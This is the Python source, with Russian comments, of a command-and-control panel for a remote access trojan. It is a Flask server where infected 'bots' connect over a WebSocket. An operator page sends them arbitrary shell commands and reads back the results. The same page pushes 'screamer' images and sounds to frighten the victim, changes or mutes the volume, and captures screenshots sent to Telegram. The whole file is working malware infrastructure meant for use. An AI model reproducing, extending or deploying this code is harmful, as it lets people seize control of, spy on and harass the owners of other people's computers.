import time
import threading
import os
from flask import Flask, render_template_string, request, jsonify, send_from_directory
from flask_sock import Sock

# --- Инициализация ---
app = Flask(__name__)
sock = Sock(app)

# --- Глобальные хранилища данных ---
bots, ws_map, command_results, volume_levels, events = {}, {}, {}, {}, {}

# --- СКАНИРОВАНИЕ ПАПОК С ФАЙЛАМИ ---
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
AUDIO_DIR = os.path.join(BASE_DIR, 'audio_files')
IMAGE_DIR = os.path.join(BASE_DIR, 'image_files')
os.makedirs(AUDIO_DIR, exist_ok=True)
os.makedirs(IMAGE_DIR, exist_ok=True)
audio_files = sorted([f for f in os.listdir(AUDIO_DIR) if os.path.isfile(os.path.join(AUDIO_DIR, f))])
image_files = sorted([f for f in os.listdir(IMAGE_DIR) if os.path.isfile(os.path.join(IMAGE_DIR, f))])

# --- ФИНАЛЬНЫЙ HTML-ШАБЛОН v8 ---
HTML_TEMPLATE = """
<!doctype html>
<html lang="ru"><head><meta charset="utf-8"><title>Панель управления</title>
<style>
    body{font-family:monospace;background-color:#1a1a1a;color:#0f0;} .container{width:90%;margin:auto;} h1,h2,h3{text-align:center;}
    .control-block{margin-top:20px;padding:15px;border:1px solid #0f0;}
    select,input[type="text"]{width:100%;padding:10px;margin-bottom:10px;background-color:#333;color:#0f0;border:1px solid #0f0;}
    button{background-color:#0f0;color:#1a1a1a;padding:10px;border:none;cursor:pointer;margin-right:10px;}
    pre{background-color:#000;padding:15px;border:1px solid #0f0;white-space:pre-wrap;word-wrap:break-word;min-height:50px;}
    input[type="range"]{width: 80%; vertical-align: middle;} output{padding-left:10px;}
    /* НОВЫЕ СТИЛИ ДЛЯ ГАЛЕРЕИ И СПИСКА */
    .media-gallery { display: flex; flex-wrap: wrap; gap: 10px; justify-content: center; }
    .media-gallery img { width: 100px; height: 100px; object-fit: cover; border: 2px solid #0f0; cursor: pointer; transition: transform 0.2s; }
    .media-gallery img:hover { transform: scale(1.1); border-color: #ff0; }
    .audio-list { display: flex; flex-direction: column; gap: 5px; max-height: 200px; overflow-y: auto; }
    .audio-item { background-color: #333; padding: 8px; cursor: pointer; border-left: 3px solid #0f0; transition: background-color 0.2s; }
    .audio-item:hover { background-color: #555; }
</style>
</head><body onload="document.getElementById('main_bot_select').dispatchEvent(new Event('change'))">
<div class="container"><h1>Панель управления v8 - Галерея</h1><h2>Активные боты: {{ bots|length }}</h2>
{% if bots %}
    <div class="control-block"><h3>Цель</h3><select id="main_bot_select" onchange="getCurrentVolume()">
    {% for bot_id in bots.keys() %}<option value="{{ bot_id }}">{{ bot_id }}</option>{% endfor %}</select></div>

    <!-- НОВЫЙ БЛОК: ГАЛЕРЕЯ ИЗОБРАЖЕНИЙ -->
    <div class="control-block"><h3>Галерея скримеров</h3>
      <div class="media-gallery">
            {% for f in image_files %}
            <img src="/files/image/{{f}}" alt="{{f}}" title="{{f}}" onclick="sendFileCommand('showimage', '{{f}}')">
            {% endfor %}
        </div>
    </div>
    <!-- НОВЫЙ БЛОК: СПИСОК ЗВУКОВ -->
    <div class="control-block"><h3>Фонотека</h3>
        <div class="audio-list">
            {% for f in audio_files %}
            <div class="audio-item" onclick="sendFileCommand('playsound', '{{f}}')">{{f}}</div>
            {% endfor %}
        </div>
    </div>

    <div class="control-block"><h3>Выполнение команд</h3><input type="text" id="command_input" placeholder="Введите команду..."><button onclick="sendShellCommand()">Отправить</button></div>
    <div class="control-block"><h3>Управление звуком</h3><label for="volume_slider">Громкость:</label><br><input type="range" id="volume_slider" min="0" max="100" value="50" oninput="sendControlCommand('setvolume ' + this.value)"><output id="volume_output">50%</output><br><br><button onclick="sendControlCommand('mute')">Mute</button><button onclick="sendControlCommand('unmute')">Unmute</button></div>
    <div class="control-block"><h3>Специальные команды</h3><button onclick="sendControlCommand('screenshot')">Сделать скриншот (в Telegram)</button></div>
    <div class="control-block"><h3>Результат последней команды</h3><pre id="result_output_pre">Ожидание команды...</pre></div>
{% else %}<p>Нет активных ботов.</p>{% endif %}
</div>

<!-- ОБНОВЛЕННЫЙ JAVASCRIPT -->
<script>
    const volumeSlider = document.getElementById('volume_slider'); const volumeOutput = document.getElementById('volume_output'); const resultOutput = document.getElementById('result_output_pre'); const mainBotSelect = document.getElementById('main_bot_select');
    if(volumeSlider) volumeSlider.addEventListener('input', () => { volumeOutput.value = volumeSlider.value + '%'; });

    // УНИВЕРСАЛЬНАЯ ФУНКЦИЯ ДЛЯ КОМАНД, НЕ ТРЕБУЮЩИХ ВЫБОРА ФАЙЛА
    async function sendControlCommand(command) { const botId = mainBotSelect.value; if (!botId) return; fetch('/api/control', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bot_id: botId, command: command }) }); }

    // НОВАЯ УНИВЕРСАЛЬНАЯ ФУНКЦИЯ ДЛЯ КОМАНД С ФАЙЛОМ
    async function sendFileCommand(command_type, filename) { const botId = mainBotSelect.value; if (!botId || !filename) return; const full_command = command_type + ' ' + filename; fetch('/api/control', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bot_id: botId, command: full_command }) }); }

    async function sendShellCommand() { const botId = mainBotSelect.value; const command = document.getElementById('command_input').value; if (!botId || !command) return; resultOutput.textContent = 'Выполнение...'; try { const response = await fetch('/api/shell_command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bot_id: botId, command: command }) }); const data = await response.json(); if(data.status === 'ok') { resultOutput.textContent = data.result; } else { resultOutput.textContent = 'Ошибка: ' + data.message; } } catch (error) { resultOutput.textContent = 'Сетевая ошибка: ' + error; } }
    async function getCurrentVolume() { const botId = mainBotSelect.value; if (!botId) return; try { const response = await fetch('/api/get_volume', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bot_id: botId }) }); const data = await response.json(); if (data.status === 'ok') { volumeSlider.value = data.volume; volumeOutput.value = data.volume + '%'; } } catch (error) { console.error('Error getting volume:', error); } }
</script>
</body></html>
"""

# --- БЭКЕНД-ЧАСТЬ (без изменений, кроме передачи файлов в шаблон) ---

@app.route('/files/<folder>/<filename>')
def serve_files(folder, filename):
    if folder == 'audio': return send_from_directory(AUDIO_DIR, filename)
    elif folder == 'image': return send_from_directory(IMAGE_DIR, filename)
    else: return "Not Found", 404

@app.route('/')
def index():
    # Передаем списки файлов в шаблон для динамической генерации галереи и списка
    return render_template_string(HTML_TEMPLATE, bots=bots, audio_files=audio_files, image_files=image_files)

# Остальные API и WebSocket обработчики остаются без изменений
@app.route('/api/shell_command', methods=['POST'])
def api_shell_command():
    data = request.get_json(); bot_id, cmd = data.get('bot_id'), data.get('command');
    if bot_id and cmd and bot_id in bots:
        try:
            ws = bots[bot_id];
            if bot_id in command_results: del command_results[bot_id]
            ws.send(cmd)
            for _ in range(50):
                if bot_id in command_results: return jsonify({'status': 'ok', 'result': command_results.pop(bot_id)})
                time.sleep(0.1)
            return jsonify({'status': 'error', 'message': 'Бот не ответил за 5 секунд.'}), 408
        except Exception as e: return jsonify({'status': 'error', 'message': str(e)}), 500
    return jsonify({'status': 'error', 'message': 'Неверный запрос.'}), 400
@app.route('/api/control', methods=['POST'])
def api_control():
    data = request.get_json(); bot_id, cmd = data.get('bot_id'), data.get('command')
    if bot_id and cmd and bot_id in bots:
        try: bots[bot_id].send(cmd); return jsonify({'status': 'ok'})
        except Exception as e: return jsonify({'status': 'error', 'message': str(e)}), 500
    return jsonify({'status': 'error', 'message': 'Invalid request'}), 400
@app.route('/api/get_volume', methods=['POST'])
def api_get_volume():
    bot_id = request.json.get('bot_id')
    if bot_id in bots:
        try:
            events[bot_id] = threading.Event(); bots[bot_id].send('getvolume')
            if events[bot_id].wait(timeout=3): return jsonify({'status': 'ok', 'volume': volume_levels.get(bot_id, 50)})
            else: return jsonify({'status': 'timeout'}), 408
        except Exception as e: return jsonify({'status': 'error', 'message': str(e)}), 500
    return jsonify({'status': 'not_found'}), 404
@sock.route('/ws')
def websocket_handler(ws):
    bot_ip = ws.environ.get('HTTP_X_FORWARDED_FOR', ws.environ.get('REMOTE_ADDR', 'unknown_ip'))
    bots[bot_ip] = ws; ws_map[ws] = bot_ip; print(f"[+] Новый бот: {bot_ip}")
    try:
        while True:
            result = ws.receive(); current_bot_ip = ws_map.get(ws)
            if not current_bot_ip: continue
            if result.startswith('VOL_LEVEL:'):
                level_str = result.split(':')[1]
                if level_str.isdigit():
                    volume_levels[current_bot_ip] = int(level_str)
                    if current_bot_ip in events and not events[current_bot_ip].is_set(): events[current_bot_ip].set()
            else: command_results[current_bot_ip] = result
    except Exception:
        dead_bot_ip = ws_map.get(ws, 'unknown')
        if dead_bot_ip != 'unknown':
            for d in [bots, ws_map, volume_levels, command_results, events]:
                if dead_bot_ip in d: del d[dead_bot_ip]
        print(f"[-] Бот {dead_bot_ip} отвалился.")
if __name__ == '__main__': print("Этот скрипт не предназначен для прямого запуска.")
